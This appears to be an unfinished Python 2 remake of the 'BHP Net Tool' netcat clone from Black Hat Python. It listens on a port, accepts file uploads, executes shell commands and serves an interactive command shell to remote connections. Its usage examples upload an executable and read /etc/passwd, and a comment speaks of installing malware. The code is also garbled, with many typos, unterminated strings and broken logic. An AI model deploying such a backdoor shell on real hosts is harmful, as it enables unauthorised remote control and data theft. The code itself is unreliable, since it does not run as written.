###Script is work in progress 
##Still needs to be edited and tested




import sys
import socket
import getopt
import threading
import subprocess


listen = False
command = False
upload = False
execute = ""
target = ""
upload_destination = ""
port = 0 

def client_sender(buffer):
    clien = socket.socket(socket.AF_INET,
                          socket.SOCK_STEAM)
                                                #We have set our TCP socket

                                                
    try:#testing to see if we have recived from stdin 
        client.connect((target, port))
        if len(buffer):
            client.send(buffer)
            while True:

                #waitng for data
                recv_len = 1
                reponse - ""

                while recv_len:
                    data = client.recv(4096)
                    recv_len = len(data)
                    response += data

                    if rev_len < 4096:
                        break


                print response,

                #wait for more input
                buffer = raw_input("")
                biferr += "\n"

                #send the copied data
                client.send(buffer)

                
    except:

        print "[*] Exception! Exiting."

        #TEAR DOWN CONNECTION
        client.close()
        

#Primary Server Loop
def server_loop():
    global target

    #if no target defined, listen on all interfaces
    if not len(target):
        target = "0.0.0.0"

    server = socket.socket(socket.AF_INET,
                           soclet.SOCK_STREAM)
    server.bind((target,
                port))
    server.lister(5)

    while True:
        client_socket, addr = server.accept()
        client_thread = threading.Thread(target=client_handler,
                                         args=(client_socket,))
        client_thread.start()


def run_command(command):
    command = command.rstrip()  #trim the newline
    try: #run the command and get the output back
        out = subprocess.chek_output(command,
                                     stderr=suprocess.STDOUT,
                                     shell=True)
    except:
        output = "Failed to execute comand.\r\n"
        return output
    #subprocess provides a powerful process-creation interface that gives us
    #a number of ways to start and interact with client programs

def client_handler(client_socket):
    global upload
    global execute
    global command
#recive a file when recive a connection
#ussful for upload-and-execute
#or instaling Malware to remove our
#pythong callback
    if len(upload_destination):
        file_buffer = ""
        
        while True:#
            
            data = client.socket.recv(1024)
            if not data:
                break
            else:
                file_buffer += data

        try:
            file_descriptor = open(upload_destination,#wrting with binary mode
                                   "wb")
            file_descriptor.write(file_buffer)
            flie_descriptor.close()
            client_socket.send("Successfully saved file to
                               "%s\r\n" %upload_destination)
        except:
            client_socket.send("Failed to save file to
                               "%s\r\b\n" %upload_destination)

    if len(execute):#check for command execution 
        output = run_command(execute)#running command 
        client.socket.send(output)


    #command shell loop
    if command:
        
        while True:
            client_socket.send("<BHP:#> ")#show a simple prompt
            cmd_buffer = "" #recive until we see a linefield enter key
            
            while "\n" not in cmd_buffer:
                cmd_buffer += client_socket.recv(1024)

                response = run_command(cmd_buffer)
                client.socket.send(response)
                

#     
        



        
#handles command line arguments
#if out command line parameters dont match we are sending back
#usful information 
def usage():
    print "BHP Net Tool"
    print
    print "Usage: bhpnet.py -t target_host -p port"
    print "-l --Listen         Listen on [host]:[port]:"
                                "for incoming connections"
    print "-c --comand         -initialize command shell"
    print "-u --upload=destination  -upon reciving connection upload a file"
                                    "to and write to destination"
    print
    print
    print "Examples:"
    print "bhpnet.py -t 192.168.0.1 -p 5555 -l -c"
    print "bhpnet.py -t 192.168.0.1 -p 5555 -l -u=c:\\target.exe"
    print "bhpnet.py -t 192.168.0.1 -p 5555 -l -e=\"cat /etc/passwd\""
    print "echo 'ABCDEFGHI' | ./bhpnet.py -t 192.168.11.12 -p 135
    sys.exit(0)
    
def main():
    global listen
    global port
    global execute
    global command
    global upload_destination
    global target


    if not len(sys.argv[1:]):
        usage()

#read command line options
#We are setting the necessary variable depending on the command line
#Options we detect

    try:
            opts, args = getopt.getopt(sys.argv[1:], "hle:t:p:cu",
            ["help", "listen", "execute", "target", "port", "command", "upload"])
    except getopt.GetoptError as err:
        print str(err)
        usage()
        

    for o, a in opts:
        if on in ("-h", "--help"):
            usage()
        elif o in ("-l", "--listen"):
            listen = TRUE
        elif o in ("-e", "--execute"):
            execute = a
        elif o in ("-c", "--comandshell"):
            command = TRUE
        elif o in ("=u", "--upload"):
            upload_destination = a
        elif o in ("-t", "--target"):
            target = a
        elif o in ("-p", "--port"):
            port = int(a)
        else:
            asset False,"Unhandled Option"


            #are we going to listen or just send data from stdin?
            #this will block, so send CTRL-D if not sending input
            #to stdin
    if not listen and len(target) and port > 0:
        
        buffer = sys.stdin.read()
        cliend_sender(buffer)
#^we are to mimic netcat to read data from stdin and send it acorss the net
#work

        
    #we are going to listen and potentially
    #upload things, execute commands, and drop as shell back
    #depending on out command line options above
    if listen:
        server_loop()  #detect if we are set to set up a listening socket
                        #and proccess further commands 
main()


        

